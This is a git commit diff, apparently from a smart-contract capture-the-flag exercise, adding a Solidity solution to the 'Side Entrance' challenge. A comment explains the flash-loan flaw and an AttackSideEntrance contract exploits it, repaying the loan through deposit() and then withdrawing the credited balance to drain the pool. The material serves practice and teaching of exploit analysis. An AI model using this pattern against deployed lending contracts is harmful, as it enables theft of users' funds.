1c0f86b0aed63cab6102b36fd5960a5f370f924f
vyeli <yeliv9527@gmail.com>
2024-09-04 01:14:05 -0300

    SideEntrance Solution

--- test/side-entrance/SideEntrance.t.sol
+++ test/side-entrance/SideEntrance.t.sol
@@ -45,7 +45,16 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        /*  The contract SideEntranceLenderPool has a vulnerability that allows an attacker to drain the pool of ETH.
+            when performing the flash loan it executes the execute() function of the IFlashLoanEtherReceiver interface.
+            The attacker can call the flashLoan() function with a smart contract that implements the IFlashLoanEtherReceiver interface.
+            The vulnerability resides that if the attacker contract calls deposit() function of the SideEntranceLenderPool contract
+            the balance of the attacker contract will be increased by the amount of ETH deposited while maintaining the balance of the pool.
+            The attacker can then withdraw the ETH from the pool by calling the withdraw() function of the SideEntranceLenderPool contract.
+        */
+        AttackSideEntrance attacker = new AttackSideEntrance(pool, recovery);
+        attacker.attack();
+
     }
 
     /**
@@ -55,4 +64,26 @@ contract SideEntranceChallenge is Test {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
+}
+
+contract AttackSideEntrance{
+    SideEntranceLenderPool pool;
+    address recovery;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        recovery.call{value: address(this).balance}("");
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+    // the contract need to have either a receive() or a fallback() function to receive the ETH
+    receive() external payable {}
 }
